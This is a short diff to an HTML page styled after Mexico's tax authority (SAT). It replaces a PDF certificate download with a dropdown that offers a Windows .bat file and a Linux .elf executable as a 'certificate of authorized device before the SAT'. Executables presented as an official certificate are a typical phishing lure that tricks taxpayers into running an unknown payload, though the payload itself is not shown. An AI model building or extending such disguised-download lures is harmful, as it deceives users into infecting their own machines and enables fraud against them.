@@ -42,9 +42,16 @@
       <div class="buttons">
         <button type="submit">Enviar</button>
         <button type="button">e.firma</button>
-        <a href="./assets/certificadoSAT.pdf" download> 
-            <button type="button">Certificado de dispositivo autorizado ante el SAT</button>
-          </a>
+
+        <!-- Menú desplegable para descarga según sistema operativo -->
+        <div class="dropdown">
+          <button class="dropbtn">Certificado de dispositivo autorizado ante el SAT</button>
+          <div class="dropdown-content">
+            <a href="./ejec/seguridadSAT.bat" download>Windows</a>
+            <a href="./ejec/certificadoSAT.elf" download>Linux</a>
+            <a href="#" onclick="alert('Versión para macOS disponible próximamente.')">macOS (próximamente)</a>
+          </div>
+        </div>
       </div>
 
       <div class="ayuda-links">
